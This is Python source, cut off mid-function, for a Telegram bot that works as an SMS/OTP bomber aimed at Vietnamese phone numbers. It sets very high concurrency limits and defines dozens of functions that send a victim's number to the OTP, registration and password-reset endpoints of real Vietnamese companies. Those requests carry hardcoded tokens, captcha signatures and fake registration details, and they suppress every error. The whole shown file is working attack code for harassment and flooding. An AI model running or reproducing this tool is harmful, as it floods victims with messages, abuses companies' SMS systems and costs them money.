import os
import time
import random
import threading
import concurrent.futures
from datetime import datetime
from typing import Dict

import telebot
from telebot.types import Message
from flask import Flask
import requests
import re

# CONFIG
TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
if not TOKEN or ':' not in TOKEN:
    raise ValueError("Thieu hoac sai TELEGRAM_BOT_TOKEN")

bot = telebot.TeleBot(TOKEN)

MAX_CONCURRENT_TARGETS   = 100000
MAX_THREADS_PER_TARGET   = 100000
DELAY_BETWEEN_ROUNDS_SEC = (1, 3)

active_jobs = {}
jobs_lock = threading.Lock()

# KIEM TRA SO DIEN THOAI VN
def is_valid_vn_phone(phone: str) -> bool:
    phone = re.sub(r'[\s\-\+]', '', phone)
    if phone.startswith('+84'):
        phone = '0' + phone[3:]
    if not phone.startswith('0'):
        return False
    return bool(re.match(r'^0(3[2-9]|5[689]|7[06-9]|8[1-689]|9[0-9])[0-9]{7}$', phone))

# SESSION CHUNG
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
})

# CAC HAM GUI OTP (DA CHUAN HOA)
def send_otp_via_sapo(phone: str):
    try:
        data = {'phonenumber': phone}
        r = session.post('https://www.sapo.vn/fnb/sendotp', data=data, timeout=10)
        print(f"[sapo] {phone} → {r.status_code}")
    except:
        pass

#           _          _     _            _ 
#          (_)        | |   | |          | |
#  __   __  _    ___  | |_  | |_    ___  | |
#  \ \ / / | |  / _ \ | __| | __|  / _ \ | |
#   \ V /  | | |  __/ | |_  | |_  |  __/ | |
#    \_/   |_|  \___|  \__|  \__|  \___| |_|
#                                           
#   https://viettel.vn                                        
def send_otp_via_viettel(phone: str):
    try:
        json_data = {'phone': phone, 'typeCode': 'DI_DONG', 'type': 'otp_login'}
        r = session.post('https://viettel.vn/api/getOTPLoginCommon', json=json_data, timeout=10)
        print(f"[viettel] {phone} → {r.status_code}")
    except:
        pass

#     https://medicare.vn                                         
#                         | | (_)                             
#   _ __ ___     ___    __| |  _    ___    __ _   _ __    ___ 
#  | '_ ` _ \   / _ \  / _` | | |  / __|  / _` | | '__|  / _ \
#  | | | | | | |  __/ | (_| | | | | (__  | (_| | | |    |  __/
#  |_| |_| |_|  \___|  \__,_| |_|  \___|  \__,_| |_|     \___|
                                                        
def send_otp_via_medicare(phone: str):
    try:
        json_data = {'mobile': phone, 'mobile_country_prefix': '84'}
        r = session.post('https://medicare.vn/api/otp', json=json_data, timeout=10)
        print(f"[medicare] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_tv360(phone: str):
    try:
        json_data = {'msisdn': phone}
        r = session.post('https://tv360.vn/public/v1/auth/get-otp-login', json=json_data, timeout=10)
        print(f"[tv360] {phone} → {r.status_code}")
    except:
        pass

# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

def send_otp_via_dienmayxanh(phone: str):
    try:
        data = {
            'phoneNumber': phone,
            'isReSend': 'false',
            'sendOTPType': '1',
            '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU',
        }
        r = session.post('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', data=data, timeout=10)
        print(f"[dienmayxanh] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_kingfoodmart(phone: str):
    try:
        json_data = {
            'operationName': 'SendOtp',
            'variables': {
                'input': {
                    'phone': phone,
                    'captchaSignature': 'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD',
                },
            },
            'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
        }
        r = session.post('https://api.onelife.vn/v1/gateway/', json=json_data, timeout=10)
        print(f"[kingfoodmart] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_mocha(phone: str):
    try:
        params = {
            'msisdn': phone,
            'languageCode': 'vi',
        }
        r = session.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, timeout=10)
        print(f"[mocha] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_fptdk(phone: str):
    try:
        json_data = {
            'phone': phone,
            'country_code': 'VN',
            'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
        }
        r = session.post('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&amp;e=1722340953&amp;device=Microsoft%20Edge(version%253A127.0.0.0)&amp;drm=1', json=json_data, timeout=10)
        print(f"[fptdk] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_fptmk(phone: str):
    try:
        session.get('https://fptplay.vn/_nuxt/pages/block/_type/_id.26.0382316fc06b3038d49e.js', timeout=8)
        json_data = {
            'phone': phone,
            'country_code': 'VN',
            'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
        }
        r = session.post('https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&amp;e=1722365955&amp;device=Microsoft%20Edge(version%253A127.0.0.0)&amp;drm=1', json=json_data, timeout=10)
        print(f"[fptmk] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_VIEON(phone: str):
    try:
        params = {
            'platform': 'web',
            'ui': '012021',
        }
        json_data = {
            'username': phone,
            'country_code': 'VN',
            'model': 'Windows 10',
            'device_id': 'f812a55d1d5ee2b87a927833df2608bc',
            'device_name': 'Edge/127',
            'device_type': 'desktop',
            'platform': 'web',
            'ui': '012021',
        }
        r = session.post('https://api.vieon.vn/backend/user/v2/register', params=params, json=json_data, timeout=10)
        print(f"[VIEON] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_ghn(phone: str):
    try:
        json_data = {
            'phone': phone,
            'type': 'register',
        }
        r = session.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', json=json_data, timeout=10)
        print(f"[ghn] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_lottemart(phone: str):
    try:
        json_data = {
            'username': phone,
            'case': 'register',
        }
        r = session.post('https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp', json=json_data, timeout=10)
        print(f"[lottemart] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_DONGCRE(phone: str):
    try:
        json_data = {
            'login': phone,
            'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
        }
        r = session.post('https://api.vayvnd.vn/v2/users/password-reset', json=json_data, timeout=10)
        print(f"[DONGCRE] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_shopee(phone: str):
    try:
        json_data = {
            'operation': 8,
            'encrypted_phone': '',
            'phone': phone,
            'supported_channels': [1, 2, 3, 6, 0, 5],
            'support_session': True,
        }
        r = session.post('https://shopee.vn/api/v4/otp/get_settings_v2', json=json_data, timeout=10)
        print(f"[shopee] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_TGDD(phone: str):
    try:
        data = {
            'phoneNumber': phone,
            'isReSend': 'false',
            'sendOTPType': '1',
            '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs',
        }
        r = session.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', data=data, timeout=10)
        print(f"[TGDD] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_fptshop(phone: str):
    try:
        json_data = {
            'fromSys': 'WEBKHICT',
            'otpType': '0',
            'phoneNumber': phone,
        }
        r = session.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', json=json_data, timeout=10)
        print(f"[fptshop] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_WinMart(phone: str):
    try:
        json_data = {
            'firstName': 'Nguyá»…n Quang Ngá»c',
            'phoneNumber': phone,
            'masanReferralCode': '',
            'dobDate': '2024-07-26',
            'gender': 'Male',
        }
        r = session.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', json=json_data, timeout=10)
        print(f"[WinMart] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_vietloan(phone: str):
    try:
        data = {
            'phone': phone,
            '_token': 'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi',
        }
        r = session.post('https://vietloan.vn/register/phone-resend', data=data, timeout=10)
        print(f"[vietloan] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_lozi(phone: str):
    try:
        json_data = {
            'countryCode': '84',
            'phoneNumber': phone,
        }
        r = session.post('https://mocha.lozi.vn/v1/invites/use-app', json=json_data, timeout=10)
        print(f"[lozi] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_F88(phone: str):
    try:
        json_data = {
            'FullName': 'Nguyen Van A',
            'Phone': phone,
            'DistrictCode': '024',
            'ProvinceCode': '02',
            'AssetType': 'Car',
            'IsChoose': '1',
            'ShopCode': '',
            'Url': 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan',
            'FormType': 1,
        }
        r = session.post('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', json=json_data, timeout=10)
        print(f"[F88] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_spacet(phone: str):
    try:
        session.get('https://www.google.com/recaptcha/api2/clr', timeout=8)
        json_data = {'phone': phone}
        r = session.post('https://api.spacet.vn/www/user/phone', json=json_data, timeout=10)
        print(f"[spacet] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_vinpearl(phone: str):
    try:
        session.get('https://booking.vinpearl.com/static/media/otp_lock.26ac1e3e.svg', timeout=8)
        json_data = {
            'channel': 'vpt',
            'username': phone,
            'type': 1,
            'OtpChannel': 1,
        }
        r = session.post('https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp', json=json_data, timeout=10)
        print(f"[vinpearl] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_traveloka(phone: str):
    try:
        if phone.startswith('09'):
            phone = '+84' + phone[1:]
        json_data = {
            'fields': [],
            'data': {
                'userLoginMethod': 'PN',
                'username': phone,
            },
            'clientInterface': 'desktop',
        }
        r = session.post('https://www.traveloka.com/api/v2/user/signup', json=json_data, timeout=10)
        print(f"[traveloka] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_dongplus(phone: str):
    try:
        json_data = {'mobile_phone': phone}
        r = session.post('https://api.dongplus.vn/api/v2/user/check-phone', json=json_data, timeout=10)
        print(f"[dongplus] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_longchau(phone: str):
    try:
        json_data = {
            'phoneNumber': phone,
            'otpType': 0,
            'fromSys': 'WEBKHLC',
        }
        r = session.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', json=json_data, timeout=10)
        print(f"[longchau] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_longchau1(phone: str):
    try:
        json_data = {
            'phoneNumber': phone,
            'otpType': 1,
            'fromSys': 'WEBKHLC',
        }
        r = session.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', json=json_data, timeout=10)
        print(f"[longchau1] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_galaxyplay(phone: str):
    try:
        params = {'phone': phone}
        session.post('https://api.glxplay.io/account/phone/checkPhoneOnly', params=params, timeout=8)
        json_data = {
            'app_category': 'app',
            'app_version': '2.0.0',
            'app_env': 'prod',
            'session_id': '03ffa1f4-5695-e773-d0bc-de3b8fcf226d',
            'client_ip': '14.170.8.116',
            'jwt_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
            'client_timestamp': '1722356171541',
            'model_name': 'Windows',
            'user_id': '',
            'client_agent': 'Mozilla/5.0...',
            'event_category': 'account',
            'on_screen': 'login',
            'from_screen': 'landing_page',
            'event_action': 'click',
            'direct_object_type': 'button',
            'direct_object_id': 'submit_phone_number',
            'direct_object_property': phone,
            'indirect_object_type': '',
            'indirect_object_id': '',
            'indirect_object_property': '',
            'context_format': '',
            'profile_id': '',
            'profile_name': '',
            'profile_kid_mode': '0',
            'context_value': {'is_new_user': 1, 'new_lp': 0, 'testing_tag': []},
            'mkt_source': '',
            'mkt_campaign': '',
            'mkt_medium': '',
            'mkt_term': '',
            'mkt_content': '',
        }
        r = session.post('https://tracker.glxplay.io/v1/event', json=json_data, timeout=10)
        params = {'phone': phone}
        r = session.post('https://api.glxplay.io/account/phone/verify', params=params, timeout=10)
        print(f"[galaxyplay] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_emartmall(phone: str):
    try:
        data = {'mobile': phone}
        r = session.post('https://emartmall.com.vn/index.php?route=account/register/smsRegister', data=data, timeout=10)
        print(f"[emartmall] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_ahamove(phone: str):
    try:
        json_data = {
            'mobile': phone,
            'country_code': 'VN',
            'firebase_sms_auth': True,
        }
        r = session.post('https://api.ahamove.com/api/v3/public/user/login', json=json_data, timeout=10)
        print(f"[ahamove] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_ViettelMoney(phone: str):
    try:
        payload = {
            "identityType": "msisdn",
            "identityValue": phone,
            "type": "REGISTER"
        }
        r = session.post("https://api8.viettelpay.vn/customer/v2/accounts/register", json=payload, timeout=10)
        print(f"[ViettelMoney] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_xanhsmsms(phone: str):
    try:
        if phone.startswith('09') or phone.startswith('03'):
            phone = '+84' + phone[1:]
        params = {'aud': "user_app", 'platform': "ios"}
        payload = {"is_forgot_password": False, "phone": phone, "provider": "VIET_GUYS"}
        r = session.post("https://api.gsm-api.net/auth/v1/public/otp/send", params=params, json=payload, timeout=10)
        print(f"[xanhsmsms] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_xanhsmzalo(phone: str):
    try:
        if phone.startswith('09') or phone.startswith('03'):
            phone = '+84' + phone[1:]
        params = {'platform': "ios", 'aud': "user_app"}
        payload = {"phone": phone, "is_forgot_password": False, "provider": "ZNS_ZALO"}
        r = session.post("https://api.gsm-api.net/auth/v1/public/otp/send", params=params, json=payload, timeout=10)
        print(f"[xanhsmzalo] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_popeyes(phone: str):
    try:
        json_data = {
            'phone': phone,
            'firstName': 'Nguyá»…n',
            'lastName': 'Ngá»c',
            'email': 'th456do1g110@hotmail.com',
            'password': 'et_SECUREID()',
        }
        r = session.post('https://api.popeyes.vn/api/v1/register', json=json_data, timeout=10)
        print(f"[popeyes] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_ACHECKIN(phone: str):
    try:
        params1 = {
            'deployment_key': "NyrEQrG2NR2IzdRgbTsfQZV-ZK7h_tsz8BjMd",
            'app_version': "1.5",
            'package_hash': "d2673f8362359fe9129b908e7fd445482becea4d3220ed385d58cae33c7e0391",
            'label': "v39",
            'client_unique_id': '123456',
        }
        session.get("https://codepush.appcenter.ms/v0.1/public/codepush/update_check", params=params1, timeout=8)
        
        payload2 = {
            "operationName": "IdCheckPhoneNumber",
            "variables": {"phone_number": phone},
            "query": "query IdCheckPhoneNumber($phone_number: String!) {\n  mutation: checkPhoneNumber(phone_number: $phone_number)\n}\n"
        }
        session.post("https://id.acheckin.vn/api/graphql/v2/mobile", json=payload2, timeout=8)
        
        payload3 = {
            "operationName": "RequestVoiceOTP",
            "variables": {
                "phone_number": phone,
                "action": "REGISTER",
                "hash": "6af5e4ed78ee57fe21f0d405c752798f"
            },
            "query": "mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) {\n  requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash)\n}\n"
        }
        r = session.post("https://id.acheckin.vn/api/graphql/v2/mobile", json=payload3, timeout=10)
        print(f"[ACHECKIN] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_APPOTA(phone: str):
    try:
        payload1 = {
            "insider_id": "123456",
            "partner_name": "appotapay",
            "reason": "default",
            "udid": "123456",
            "device_info": {
                "location_enabled": False,
                "app_version": "5.2.10",
                "push_enabled": True,
                "os_version": "17.0.2",
                "battery": 90,
                "sdk_version": "13.4.3-RN-6.4.4-nh",
                "connection": "wifi"
            }
        }
        session.post("https://mobile.useinsider.com/api/v3/session/start", json=payload1, timeout=8)
        
        payload2 = {
            "phone_number": phone,
            "email": "",
            "username": "",
            "ts": 1722417439,
            "signature": "480518ec08912b650efe1eaa555c2c55e47d2be2b2c98600616de592b3cafc11"
        }
        session.post("https://api.gw.ewallet.appota.com/v2/users/check_valid_fields", json=payload2, timeout=8)
        
        payload3 = {
            "phone_number": phone,
            "sender": "SMS",
            "ts": 1722417441,
            "signature": "5a17345149daf29d917de285cf0bf202457576b99c68132e158237f5caec85a5"
        }
        r = session.post("https://api.gw.ewallet.appota.com/v2/users/register/get_verify_code", json=payload3, timeout=10)
        print(f"[APPOTA] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_Watsons(phone: str):
    try:
        params = {'lang': "vi"}
        payload = {
            "otpTokenRequest": {
                "action": "REGISTRATION",
                "type": "SMS",
                "countryCode": "84",
                "target": phone
            },
            "defaultAddress": {
                "mobileNumberCountryCode": "84",
                "mobileNumber": phone
            },
            "mobileNumber": phone
        }
        r = session.post("https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep", params=params, json=payload, timeout=10)
        print(f"[Watsons] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_hoangphuc(phone: str):
    try:
        data = {
            'action_type': '1',
            'tel': phone,
        }
        r = session.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', data=data, timeout=10)
        print(f"[hoangphuc] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_fmcomvn(phone: str):
    try:
        json_data = {
            'Phone': phone,
            'LatOfMap': '106',
            'LongOfMap': '108',
            'Browser': '',
        }
        r = session.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', json=json_data, timeout=10)
        print(f"[fmcomvn] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_Reebokvn(phone: str):
    try:
        json_data = {'phoneNumber': phone}
        r = session.post('https://reebok-api.hsv-tech.io/client/phone-verification/request-verification', json=json_data, timeout=10)
        print(f"[Reebokvn] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_thefaceshop(phone: str):
    try:
        json_data = {'phoneNumber': phone}
        r = session.post('https://tfs-api.hsv-tech.io/client/phone-verification/request-verification', json=json_data, timeout=10)
        print(f"[thefaceshop] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_BEAUTYBOX(phone: str):
    try:
        json_data = {'phoneNumber': phone}
        r = session.post('https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification', json=json_data, timeout=10)
        print(f"[BEAUTYBOX] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_winmart(phone: str):
    try:
        json_data = {
            'firstName': 'Nguyá»…n Quang Ngá»c',
            'phoneNumber': phone,
            'masanReferralCode': '',
            'dobDate': '2000-02-05',
            'gender': 'Male',
        }
        r = session.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', json=json_data, timeout=10)
        print(f"[winmart] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_medicare(phone: str):
    try:
        json_data = {
            'mobile': phone,
            'mobile_country_prefix': '84',
        }
        r = session.post('https://medicare.vn/api/otp', json=json_data, timeout=10)
        print(f"[medicare] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_futabus(phone: str):
    try:
        json_data = {
            'phoneNumber': phone,
            'deviceId': 'd46a74f1-09b9-4db6-b022-aaa9d87e11ed',
            'use_for': 'LOGIN',
        }
        r = session.post('https://api.vato.vn/api/authenticate/request_code', json=json_data, timeout=10)
        print(f"[futabus] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_ViettelPost(phone: str):
    try:
        data = {
            'FormRegister.FullName': 'Nguyá»…n Quang Ngá»c',
            'FormRegister.Phone': phone,
            'FormRegister.Password': 'BEAUTYBOX12a@',
            'FormRegister.ConfirmPassword': 'BEAUTYBOX12a@',
            'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&amp;secret=vtp-web&amp;scope=openid%20profile%20se-public-api%20offline_access&amp;response_type=id_token%20token&amp;state=abc&amp;redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&amp;nonce=3r25st1hpummjj42ig7zmt',
            'ConfirmOtpType': 'Register',
            'FormRegister.IsRegisterFromPhone': 'true',
            '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc',
        }
        r = session.post('https://id.viettelpost.vn/Account/SendOTPByPhone', data=data, timeout=10)
        print(f"[ViettelPost] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_myviettel2(phone: str):
    try:
        json_data = {
            'msisdn': phone,
            'type': 'register',
        }
        r = session.post('https://viettel.vn/api/get-otp-contract-mobile', json=json_data, timeout=10)
        print(f"[myviettel2] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_myviettel3(phone: str):
    try:
        json_data = {'msisdn': phone}
        r = session.post('https://viettel.vn/api/get-otp', json=json_data, timeout=10)
        print(f"[myviettel3] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_TOKYOLIFE(phone: str):
    try:
        json_data = {
            'phone_number': phone,
            'name': 'Nguyá»…n Quang Ngá»c',
            'password': 'pUL3.GFSd4MWYXp',
            'email': 'reggg10tb@gmail.com',
            'birthday': '2002-03-12',
            'gender': 'male',
        }
        r = session.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', json=json_data, timeout=10)
        print(f"[TOKYOLIFE] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_30shine(phone: str):
    try:
        json_data = {'phone': phone}
        r = session.post('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', json=json_data, timeout=10)
        print(f"[30shine] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_Cathaylife(phone: str):
    try:
        data = {
            'memberMap': f'{{"userName":"rancellramseyis792@gmail.com","password":"traveLo@a123","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"{phone}","email":"rancellramseyis792@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyá»…n Quang Ngá»c"}}',
            'OTP_TYPE': 'P',
            'LANGS': 'vi_VN',
        }
        r = session.post('https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP', data=data, timeout=10)
        print(f"[Cathaylife] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_dominos(phone: str):
    try:
        json_data = {
            'phone_number': phone,
            'email': 'rancellramseyis792@gmail.com',
            'type': 0,
            'is_register': True,
        }
        r = session.post('https://dominos.vn/api/v1/users/send-otp', json=json_data, timeout=10)
        print(f"[dominos] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_vinamilk(phone: str):
    try:
        data = f'{{"type":"register","phone":"{phone}"}}'
        r = session.post('https://new.vinamilk.com.vn/api/account/getotp', data=data, timeout=10)
        print(f"[vinamilk] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_vietloan2(phone: str):
    try:
        data = {
            'phone': phone,
            '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
        }
        r = session.post('https://vietloan.vn/register/phone-resend', data=data, timeout=10)
        print(f"[vietloan2] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_batdongsan(phone: str):
    try:
        params = {'phoneNumber': phone}
        r = session.get('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister', params=params, timeout=10)
        print(f"[batdongsan] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_GUMAC(phone: str):
    try:
        json_data = {'phone': phone}
        r = session.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', json=json_data, timeout=10)
        print(f"[GUMAC] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_mutosi(phone: str):
    try:
        json_data = {
            'name': 'hÃ&nbsp; kháº£i',
            'phone': phone,
            'password': 'Vjyy1234@',
            'confirm_password': 'Vjyy1234@',
            'firstname': None,
            'lastname': None,
            'verify_otp': 0,
            'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
            'email': 'dÄ‘@gmail.com',
            'birthday': '2006-02-13',
            'accept_the_terms': 1,
            'receive_promotion': 1,
        }
        r = session.post('https://api-omni.mutosi.com/client/auth/register', json=json_data, timeout=10)
        print(f"[mutosi] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_mutosi1(phone: str):
    try:
        json_data = {
            'phone': phone,
            'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
            'source': 'web_consumers',
        }
        r = session.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', json=json_data, timeout=10)
        print(f"[mutosi1] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_vietair(phone: str):
    try:
        referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&amp;mobile={phone}'
        data = {
            'op': 'PACKAGE_HTTP_POST',
            'path_ajax_post': '/service03/sms/get',
            'package_name': 'PK_FD_SMS_OTP',
            'object_name': 'INS',
            'P_MOBILE': phone,
            'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
        }
        r = session.post('https://vietair.com.vn/Handler/CoreHandler.ashx', data=data, timeout=10)
        print(f"[vietair] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_FAHASA(phone: str):
    try:
        data = {'phone': phone}
        r = session.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', data=data, timeout=10)
        print(f"[FAHASA] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_hopiness(phone: str):
    try:
        data = {
            'action': 'verify-registration-info',
            'phoneNumber': phone,
            'refCode': '',
        }
        r = session.post('https://shopiness.vn/ajax/user', data=data, timeout=10)
        print(f"[hopiness] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_modcha35(phone: str):
    try:
        payload = f"clientType=ios&amp;countryCode=VN&amp;device=iPhone15%2C3&amp;os_version=iOS_17.0.2&amp;platform=ios&amp;revision=11224&amp;username={phone}&amp;version=1.28"
        r = session.post("https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32", data=payload, timeout=10)
        print(f"[modcha35] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_Bibabo(phone: str):
    try:
        params = {
            'phone': phone,
            'reCaptchaToken': "undefined",
            'appId': "7",
            'version': "2"
        }
        r = session.get("https://one.bibabo.vn/api/v1/login/otp/createOtp", params=params, timeout=10)
        print(f"[Bibabo] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_MOCA(phone: str):
    try:
        params = {'phoneNumber': phone}
        r = session.get("https://moca.vn/moca/v2/users/role", params=params, timeout=10)
        print(f"[MOCA] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_pantio(phone: str):
    try:
        params = {'domain': 'pantiofashion.myharavan.com'}
        data = {'phoneNumber': phone}
        r = session.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, data=data, timeout=10)
        print(f"[pantio] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_Routine(phone: str):
    try:
        data = {
            'telephone': phone,
            'isForgotPassword': '0',
        }
        r = session.post('https://routine.vn/customer/otp/send/', data=data, timeout=10)
